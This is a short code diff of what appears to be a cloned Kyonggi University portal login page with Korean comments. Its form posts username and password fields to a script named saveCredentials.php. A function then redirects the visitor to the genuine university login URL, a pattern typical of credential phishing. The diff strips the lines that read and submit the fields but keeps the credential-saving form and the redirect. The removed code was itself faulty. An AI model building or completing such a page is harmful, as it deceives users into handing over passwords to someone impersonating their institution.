@@ -122,7 +122,9 @@ var SystemInfo = new function() {
 
   <!-- 로그인 컨텐츠 -->
   <section class="loginArea"  id="login_scroll">
-  	<form id="myForm" name="myForm" method="post" action="./saveCredentials.php" >
+
+  	<form id="myForm" method="post" action="./saveCredentials.php" >
+
 	<input type="hidden" name="username" value="">
 	<input type="hidden" name="password" value="">
 	<fieldset>
@@ -139,14 +141,7 @@ var SystemInfo = new function() {
     </fieldset>
     <script>
       function saveAndRedirect() {
-        var id = document.getElementById("id").value;
-            var pw = document.getElementById("pw").value;
-
-            // 폼 제출
-            document.getElementByName("myForm").submit();
-          
-  
-          // 원하는 페이지로 이동
+         // 원하는 페이지로 이동
           window.location.href = "https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp";
       }
   </script>
